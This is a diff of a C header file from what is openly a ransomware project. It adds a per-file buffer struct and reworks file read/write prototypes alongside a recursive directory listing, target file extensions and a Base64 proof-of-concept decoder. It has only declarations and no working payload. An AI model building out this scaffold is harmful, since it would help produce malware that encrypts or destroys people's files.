@@ -20,6 +20,21 @@
 #define BUFSIZE 1024
 
 /**
+  * struct target_file_s - refillable buffers for each target file
+  * @filepath: path to the file from readdir
+  * @buf: buffer of BUFSIZE * 4
+  * @file_info: information about the target file
+ **/
+typedef struct target_file_s
+{
+	char *filepath;
+	char *buf;
+	off_t file_offset;
+	size_t bytes_read;
+	struct stat file_info;
+} target_file_t;
+void free_target_file_struct(target_file_t target_file);
+/**
   * struct ransom_s - struct to store often used values
   * @root_path: string that represents the target filepath
   * @file_ext_nontoken: string that contains all target file extensions
@@ -36,6 +51,7 @@ typedef struct ransom_s
 	unsigned int num_of_file_ext;
 	struct utsname os_info;
 	struct node_s *target_files;
+	target_file_t *target_file_buf;
 } ransom_t;
 void free_ransom_struct(ransom_t *ransom);
 
@@ -74,8 +90,8 @@ void *recalloc(void *ptr, size_t old_size, size_t new_size);
 
 /* OS functions */
 node_t *recurse_ls(char *filename, ransom_t *ransom);
-char *read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *));
-size_t write_file(node_t *node, char *buffer);
+size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *));
+char *write_file(char *filepath, ransom_t *ransom);
 
 /* Base64 POC */
 char *base64decode (const void *b64_decode_str, int decode_size);
